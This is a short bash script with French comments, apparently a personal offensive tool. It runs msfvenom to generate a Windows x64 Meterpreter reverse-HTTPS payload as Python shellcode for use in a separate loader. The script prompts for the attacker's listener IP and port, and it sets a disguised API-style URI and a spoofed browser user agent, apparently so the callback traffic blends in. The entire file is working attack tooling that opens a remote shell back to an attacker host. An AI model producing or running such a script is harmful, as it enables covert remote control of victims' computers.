#!/bin/bash

# --- 1. Définition des variables et couleurs ---
LHOST_DEF="x.x.x.x"
LPORT_DEF="xxxx"
OUTPUT_DEF="loader_shellcode.txt"

GREEN='\033[0;32m'
NC='\033[0m' # No Color

echo -e "${GREEN}=== Générateur de Shellcode Python By CHOUBIK Houssam ===${NC}"
echo "-----------------------------------------------------------"

# --- 2. Demander LHOST ---
read -p "Entrez l'adresse IP d'écoute (LHOST) [Défaut: $LHOST_DEF] : " LHOST
LHOST=${LHOST:-$LHOST_DEF}

# --- 3. Demander LPORT ---
read -p "Entrez le port d'écoute (LPORT) [Défaut: $LPORT_DEF] : " LPORT
LPORT=${LPORT:-$LPORT_DEF}

# --- 4. Demander le Fichier de Sortie ---
read -p "Nom du fichier de sortie (ex: loader.txt) [Défaut: $OUTPUT_DEF] : " OUTPUT_FILE
OUTPUT_FILE=${OUTPUT_FILE:-$OUTPUT_DEF}

# --- 5. Confirmation des paramètres ---
echo ""
echo -e "${GREEN}--- Paramètres de Génération ---${NC}"
echo "LHOST: $LHOST"
echo "LPORT: $LPORT"
echo "Fichier de sortie: $OUTPUT_FILE"
echo "--------------------------------"

# --- 6. Exécution de msfvenom ---
echo "Generation du Shellcode python..."

msfvenom -p windows/x64/meterpreter_reverse_https \
LHOST=$LHOST \
LPORT=$LPORT \
LURI=/api/v1/data/ \
HTTPUSERAGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.3240.76" \
-f python > "$OUTPUT_FILE" 2>/dev/null

# 2>/dev/null masque le message de copyright de msfvenom pour un output propre.

# --- 7. Finalisation ---
if [ $? -eq 0 ]; then
    echo ""
    echo -e "${GREEN}[SUCCÈS] Shellcode généré et stocké dans : ${OUTPUT_FILE}${NC}"
    echo "Vous devez maintenant intégrer ce contenu dans votre chargeur Python (loader.py)."
else
    echo ""
    echo -e "\033[0;31m[ÉCHEC] Erreur lors de l'exécution de msfvenom. Vérifiez les dépendances.\033[0m"
fi
